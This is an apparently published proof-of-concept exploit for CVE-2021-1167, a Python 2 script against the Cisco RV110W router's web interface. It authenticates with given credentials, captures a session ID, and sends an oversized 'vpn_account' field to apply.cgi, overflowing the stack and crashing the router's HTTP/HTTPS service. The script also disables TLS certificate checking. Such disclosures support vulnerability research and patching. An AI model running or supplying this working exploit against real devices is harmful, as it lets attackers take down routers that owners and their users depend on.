# Exploit Title: Cisco RV110W 1.2.1.7 - 'vpn_account' Denial of Service (PoC)
# Date: 2021-01
# Exploit Author: Shizhi He
# Vendor Homepage: https://www.cisco.com/
# Software Link: https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.1.7
# Version: V1.2.1.7
# Tested on: RV110W V1.2.1.7
# CVE : CVE-2021-1167
# References: 
# https://github.com/pwnninja/cisco/blob/main/vpn_client_stackoverflow.md 
# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-overflow-WUnUgv4U

#!/usr/bin/env python2

#####
## Cisco RV110W Remote Stack Overflow.
### Tested on version: V1.2.1.7 (maybe useable on other products and versions)


import os
import sys
import re
import urllib
import urllib2
import getopt
import json
import hashlib
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

###
# Usage: ./CVE-2021-1167.py 192.168.1.1 443 cisco cisco
# This PoC will crash the target HTTP/HTTPS service
###

#encrypt password
def enc(s):
    l = len(s)
    s += "%02d" % l
    mod = l + 2
    ans = ""
    for i in range(64):
	tmp = i % mod
	ans += s[tmp]
    return hashlib.md5(ans).hexdigest()

if __name__ == "__main__":
    print "Usage: ./CVE-2021-1167.py 192.168.1.1 443 cisco cisco"

    IP = sys.argv[1]
    PORT = sys.argv[2]
    USERNAME = sys.argv[3]
    PASSWORD = enc(sys.argv[4])    
    url = 'https://' + IP + ':' + PORT + '/' 

    #get session_id by POST login.cgi
    req = urllib2.Request(url + "login.cgi")
    req.add_header('Origin', url)
    req.add_header('Upgrade-Insecure-Requests', 1)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req.add_header('Referer', url)
    req.add_header('Accept-Encoding', 'gzip, deflate')
    req.add_header('Accept-Language', 'en-US,en;q=0.9')
    req.add_header('Cookie', 'SessionID=')
    data = {"submit_button": "login",
            "submit_type": "",
            "gui_action": "",
            "wait_time": "0",
            "change_action": "",
            "enc": "1",
            "user": USERNAME,
            "pwd": PASSWORD,
            "sel_lang": "EN"
            }
    r = urllib2.urlopen(req, urllib.urlencode(data))
    resp = r.read()
    login_st = re.search(r'.*login_st=\d;', resp).group().split("=")[1]
    session_id = re.search(r'.*session_id.*\";', resp).group().split("\"")[1]
    print session_id
    
    #trigger stack overflow through POST vpn_account parameter and cause denial of service
    req2 = urllib2.Request(url + "apply.cgi;session_id=" + session_id)
    req2.add_header('Origin', url)
    req2.add_header('Upgrade-Insecure-Requests', 1)
    req2.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req2.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req2.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req2.add_header('Referer', url)
    req2.add_header('Accept-Encoding', 'gzip, deflate')
    req2.add_header('Accept-Language', 'en-US,en;q=0.9')
    req2.add_header('Cookie', 'SessionID=')
    poc = "a" * 4096
    data_cmd = {
            "gui_action": "Apply",
            "submit_type": "",
            "submit_button": "vpn_client",
            "change_action": "",
            "pptpd_enable": "0",
            "pptpd_localip": "10.0.0.1",
            "pptpd_remoteip": "10.0.0.10-14",
            "pptpd_account": "",
            "vpn_pptpd_account": "1",
            "vpn_account": poc,
            "change_lan_ip": "0",
            "netbios_enable": "0",
            "mppe_disable": "0",
            "importvpnclient": "",
            "browser": "",
            "webpage_end": "1",
            }
    r = urllib2.urlopen(req2, urllib.urlencode(data_cmd))
    resp = r.read()
    print resp